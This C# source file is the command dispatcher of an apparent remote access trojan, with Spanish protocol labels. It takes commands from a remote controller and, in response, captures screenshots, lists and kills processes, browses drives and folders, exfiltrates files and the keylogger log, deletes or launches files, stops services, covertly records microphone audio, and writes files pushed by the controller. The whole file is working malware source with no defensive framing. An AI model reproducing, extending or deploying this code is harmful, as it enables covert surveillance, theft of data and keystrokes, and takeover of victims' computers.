namespace Core.Command
{
    using System;
    using System.Diagnostics;
    using System.Threading;
    using System.IO;
    using System.Linq;

    using System.ServiceProcess;
    using System.Runtime.InteropServices;
    using System.Text.RegularExpressions;

    using Core.Screenshot;
    using Core.Connection;
    using System.Windows.Forms;
    using Core.Keylogger;

    public class Command
    {
        private readonly Connection _connection;
        private readonly ScreenCapture _screenShot;

        private const int DIRECTORY_INTERVAL = 5;
        private const int TASKS_INTERVAL = 5;
        private const int INTERVAL_SEND_FILE = 1000;

        private string _previousDirectory = string.Empty;
        private string _filePathInternal = string.Empty;
        private long _fileSize = 0;

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        public Command(Connection connection)
        {
            _connection = connection ?? throw new Exception("Error, Connection class cannot be null");
            _screenShot = new ScreenCapture();
        }

        public void SendFile(string fileName)
        {
            if (!File.Exists(fileName))
            {
                _connection?.SendData("Error sending the file specified");
                return;
            }

            // Getting the File Size
            var fileSize = new FileInfo(fileName).Length;

            var information = string.Format("|archivo|{0}|{1}|", fileSize, fileName.Contains('\\') ?
                fileName.Split('\\').LastOrDefault() : fileName);

            using (var file = new StreamReader(fileName))
            {
                var buffer = file.ReadToEnd();

                _connection?.SendData(information);

                Thread.Sleep(INTERVAL_SEND_FILE);

                _connection?.SendData(buffer);
            }

            return;
        }

        public void ListDirectory(string directoryPattern)
        {
            if (!(Directory.Exists(directoryPattern) || File.Exists(directoryPattern)))
            {
                return;
            }

            var directoryFiles = Directory.GetFiles(directoryPattern);
            var directoryFolders = Directory.GetDirectories(directoryPattern);

            var singleFolder = string.Empty;
            var singleFile = string.Empty;

            foreach (var folder in directoryFolders)
            {
                singleFolder = folder.Contains("\\") ? folder.Split('\\').LastOrDefault() : singleFolder;

                _connection?.SendData(string.Format(
                    "|listado|{0}|{1}|{2}|{3}|",
                    singleFolder,
                    "Carpeta",
                    folder,
                    "0"));

                Thread.Sleep(DIRECTORY_INTERVAL);
            }

            foreach (var file in directoryFiles)
            {
                singleFile = file.Contains("\\") ? file.Split('\\').LastOrDefault() : file;

                _connection?.SendData(string.Format(
                    "|listado|{0}|{1}|{2}|{3}|",
                    singleFile,
                    "Archivo",
                    file,
                    new FileInfo(file).Length));

                Thread.Sleep(DIRECTORY_INTERVAL);
            }

            _previousDirectory = directoryPattern;

            return;
        }

        public void DetectCommand(string commandReceived)
        {
            try
            {
                if (commandReceived.StartsWith("ssr"))
                {
                    var screenBuffer = _screenShot.FullScreenshot().GetBuffer();
                    var sizeScreen = screenBuffer.Length;

                    _connection?.SendData(string.Format("|archivo|{0}|img.jpg|", sizeScreen));
                    _connection?.SendData(screenBuffer);

                    return;
                }

                if (commandReceived.StartsWith("lis"))
                {
                    var processlist = Process.GetProcesses();

                    foreach (var theprocess in processlist)
                    {
                        var processString = string.Format(
                            "|proceso|{0}|{1}|{2}|",
                            theprocess.ProcessName,
                            theprocess.MainWindowTitle
                            /*theprocess.MainModule.FileName*/,
                            theprocess.Id);

                        _connection?.SendData(processString);

                        Thread.Sleep(TASKS_INTERVAL);
                    }
                }

                if (commandReceived.StartsWith("tas"))
                {
                    var processName = Regex.Split(commandReceived, "tas")[1];
                    var result = Process.GetProcessesByName(processName);

                    foreach (var process in result)
                    {
                        process.Kill();
                    }

                    return;
                }

                if (commandReceived.StartsWith("diz"))
                {
                    var directoryName = commandReceived.Contains("\\") ?
                        commandReceived.TrimStart(new char[] { 'd', 'i', 'z' }) : Regex.Split(commandReceived, "diz")[1];

                    if (int.TryParse(directoryName, out int id))
                    {
                        var winDirDirectory = string.Format("{0}\\", Environment.GetEnvironmentVariable("windir"));

                        switch (directoryName)
                        {
                            case "1":
                                ListDirectory(winDirDirectory);
                                break;

                            case "7":
                                var logicalDrivers = DriveInfo.GetDrives();

                                foreach (var drive in logicalDrivers)
                                {
                                    var driveType = string.Empty;

                                    if (!drive.IsReady) continue;

                                    switch (drive.DriveType)
                                    {
                                        case DriveType.CDRom:
                                            driveType = "CD-ROM";
                                            break;

                                        case DriveType.Fixed:
                                            driveType = "Disco duro";
                                            break;

                                        case DriveType.Removable:
                                            driveType = "Disco extraible";
                                            break;

                                        case DriveType.Ram:
                                            driveType = "Ram";
                                            break;

                                        case DriveType.Network:
                                            driveType = "Network";
                                            break;

                                        case DriveType.NoRootDirectory:
                                        case DriveType.Unknown:
                                            driveType = "Unknown";
                                            break;
                                    }

                                    var information = string.Format(
                                        "|listado|{0}|{1}|{2}|{3}|",
                                        drive.RootDirectory,
                                        driveType,
                                        drive.Name,
                                        string.Format("{0}/{1}/{2}", drive.AvailableFreeSpace, drive.TotalFreeSpace, drive.TotalSize));

                                    _connection?.SendData(information);

                                    Thread.Sleep(DIRECTORY_INTERVAL);
                                }

                                break;
                        }
                    }
                    else
                    {
                        ListDirectory(directoryName);
                    }

                    return;
                }

                if (commandReceived.StartsWith("trx"))
                {
                    var fileName = Regex.Split(commandReceived, "trx")[1];

                    SendFile(fileName);

                    return;
                }

                if (commandReceived.StartsWith("del"))
                {
                    var path = Regex.Split(commandReceived, "del")[1];

                    // This avoid possible error/exception if we've recived a invalid path to open/delete
                    if (File.Exists(path))
                    {
                        File.Delete(path);
                    }

                    return;
                }

                if (commandReceived.StartsWith("ope"))
                {
                    var path = Regex.Split(commandReceived, "ope")[1];

                    // This avoid possible error/exception if we've recived a invalid path to open/delete
                    if (File.Exists(path))
                    {
                        var pi = new ProcessStartInfo(path);

                        Process.Start(pi);
                    }

                    return;
                }

                if (commandReceived.Contains("keylo"))
                {
                    // Getting the File Size for the keylogger
                    var fileSize = new FileInfo(_connection.LoggerPath).Length;

                    var information = string.Format("|archivo|{0}|{1}|", fileSize, _connection.LoggerPath.Contains("\\") ?
                        _connection.LoggerPath.Split('\\').LastOrDefault() : _connection.LoggerPath);

                    using (var file = new StreamReader(_connection.LoggerPath))
                    {
                        var buffer = file.ReadToEnd();

                        _connection?.SendData(information);

                        Thread.Sleep(INTERVAL_SEND_FILE);

                        _connection?.SendData(buffer);
                    }

                    return;
                }

                if (commandReceived.StartsWith("ser"))
                {
                    var serviceName = Regex.Split(commandReceived, "ser")[1];

                    var sc = new ServiceController(serviceName);

                    if (sc != null && sc.CanStop)
                    {
                        if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) ||
                            (sc.Status.Equals(ServiceControllerStatus.StopPending)))
                        {
                            return;
                        }

                        sc.Stop();

                        sc.Refresh();
                    }
                }

                // TODO: Make it async
                if (commandReceived.StartsWith("rec"))
                {
                    var seconds = int.Parse(Regex.Split(commandReceived, @"\*")[1]);
                    var filePathAudio = "testaudio.wav";

                    mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                    mciSendString("record recsound", "", 0, 0);

                    Thread.Sleep(seconds);

                    mciSendString(string.Format("save recsound {0}", filePathAudio), "", 0, 0);
                    mciSendString("close recsound ", "", 0, 0);

                    var information = string.Format("|archivo|{0}|{1}|", new FileInfo(filePathAudio).Length, filePathAudio);

                    using (var file = new StreamReader(filePathAudio))
                    {
                        var buffer = file.ReadToEnd();

                        _connection?.SendData(information);

                        Thread.Sleep(INTERVAL_SEND_FILE);

                        _connection?.SendData(buffer);
                    }

                    return;
                }

                if (commandReceived.StartsWith("fil"))
                {
                    ProcessFile(commandReceived);

                    return;
                }

                if (commandReceived.StartsWith("msg"))
                {
                    var messageBody = Regex.Split(commandReceived, "msg")[1];

                    var messageSplitted = messageBody.Split(',');

                    var messageTitle = messageSplitted[0];
                    var messageText = messageSplitted[1].Trim(',');
                    var messageType = messageSplitted[2].Trim(',');

                    MessageBox.Show(messageText, messageTitle, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                ProcessFile(commandReceived, true);

                return;
            }
            catch (Exception ex)
            {
                if (ex.Message.ToLower().Contains("denied"))
                {
                    _connection.SendData("Access Denied");
                    return;
                }

                throw ex;
            }
        }

        public void ProcessFile(string bufferFile, bool isWrite = false)
        {
            try
            {
                if (!isWrite)
                {
                    var fileInfo = Regex.Split(bufferFile, "fil")[1];
                    var dataExtension = fileInfo.Contains("*")
                        ? fileInfo.Split('*') : default(string[]);

                    // Error in command
                    if (dataExtension == null)
                    {
                        return;
                    }

                    var dataSplitted = dataExtension[1].Contains("+")
                        ? dataExtension[1].Split('+') : default(string[]);

                    // Error in command
                    if (dataSplitted == null)
                    {
                        return;
                    }

                    // TODO: Change it for TryParse and in case of error, return and exit from this function
                    long fileSize = long.Parse(dataSplitted[0]);

                    var extension = dataExtension[0];
                    var filePath = string.Empty;
                    var fileBuffer = string.Empty;

                    var fileSplitted = default(string[]);

                    if (dataExtension[1].Contains("+") && dataExtension[1].Contains("|"))
                    {
                        fileSplitted = dataExtension[1].Split('+')[1].Split('|');

                        filePath = string.Format("{0}.{1}", fileSplitted[0], extension);
                        fileBuffer = fileSplitted[1];
                    }

                    if (string.IsNullOrEmpty(filePath))
                    {
                        _connection?.SendData("Error receiving the file.");

                        return;
                    }

                    _filePathInternal = filePath;
                    _fileSize = fileSize;
                    var isAppend = (fileBuffer.Length >= fileSize);

                    // Check for append/create
                    using (var fileWriter = new StreamWriter(filePath, isAppend))
                    {
                        fileWriter.Write(fileBuffer);
                        fileWriter.Close();

                        _connection?.SendData("Receiving file.");
                    }
                }
                else
                {
                    if (string.IsNullOrEmpty(_filePathInternal))
                    {
                        return;
                    }

                    // Check for append/create
                    using (var fileWriter = new StreamWriter(_filePathInternal, true))
                    {
                        fileWriter.Write(bufferFile);
                        fileWriter.Close();
                    }

                    // Check for file transfer being completed
                    if (new FileInfo(_filePathInternal).Length >= _fileSize)
                    {
                        _connection?.SendData("File received successfully.");

                        _filePathInternal = string.Empty;
                        _fileSize = 0;
                    }
                }

                return;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
    }
}
